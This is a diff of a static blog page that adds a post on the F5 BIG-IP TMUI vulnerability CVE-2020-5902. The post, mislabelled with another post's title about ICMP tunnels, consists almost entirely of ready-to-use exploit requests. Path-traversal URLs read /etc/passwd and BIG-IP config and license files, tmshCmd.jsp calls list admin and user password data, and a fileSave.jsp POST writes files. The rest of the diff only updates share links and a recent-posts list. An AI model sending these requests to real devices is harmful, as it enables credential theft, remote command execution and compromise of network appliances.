@@ -64,6 +64,55 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-cve-2020-5902" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/29/cve-2020-5902/" class="article-date">
+  <time datetime="2020-06-29T07:59:25.000Z" itemprop="datePublished">2020-06-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/06/29/cve-2020-5902/">icmp隐藏隧道</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>文件读取</p>
+<p>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd<br>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts<br>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license<br>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf</p>
+<img src="../img/cve/2020-5902/readfile.png" class="full-image">
+
+<p>命令执行</p>
+<p>查看admin的密码：https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin<br>查看所有用户的密码：https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list auth user</p>
+<img src="../img/cve/2020-5902/rce.png" class="full-image">
+
+<p>文件上传</p>
+<p>https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp<br>POST：fileName=/tmp/1.txt&amp;content=CVE-2020-5902</p>
+<img src="../img/cve/2020-5902/uploadfile-1.png" class="full-image">
+
+<img src="../img/cve/2020-5902/uploadfile-2.png" class="full-image">
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.jinny.vip/2020/06/29/cve-2020-5902/" data-id="ckc9yvvmk0000a8nb9yyr55t2" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-icmp隐藏隧道" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/06/29/icmp%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/" class="article-date">
@@ -111,7 +160,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://www.jinny.vip/2020/06/29/icmp%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/" data-id="ckc9yum0v00008snb21dg8odg" class="article-share-link">Share</a>
+      <a data-url="http://www.jinny.vip/2020/06/29/icmp%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/" data-id="ckc9yvvmv0001a8nb9d0rf8io" class="article-share-link">Share</a>
       
       
     </footer>
@@ -148,7 +197,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://www.jinny.vip/2020/06/02/smtp-shell/" data-id="ckc9yum1600018snbcd7b7cs0" class="article-share-link">Share</a>
+      <a data-url="http://www.jinny.vip/2020/06/02/smtp-shell/" data-id="ckc9yvvmy0002a8nb4avleshi" class="article-share-link">Share</a>
       
       
     </footer>
@@ -187,6 +236,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2020/06/29/cve-2020-5902/">icmp隐藏隧道</a>
+          </li>
         
           <li>
             <a href="/2020/06/29/icmp%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93/">icmp隐藏隧道</a>
